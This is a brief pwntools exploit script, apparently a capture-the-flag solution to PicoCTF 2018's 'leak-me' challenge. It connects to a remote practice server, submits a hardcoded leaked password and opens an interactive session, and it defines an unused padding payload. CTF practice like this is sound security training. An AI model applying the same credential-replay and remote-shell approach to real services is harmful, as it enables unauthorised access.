#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/23 10:08:30
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level ='debug'
debug = 0
if debug:
    sh = process('./PicoCTF_2018_leak-me')
else:
    sh = remote("node3.buuoj.cn",29332)
elf = ELF('./PicoCTF_2018_leak-me')
# libc = ELF()
sh.recvuntil("What is your name?\n")
payload = 'a' * 0xff
sh.sendline('a')
sh.recvuntil("Password")
sh.sendline("a_reAllY_s3cuRe_p4s$word_f85406")
sh.interactive()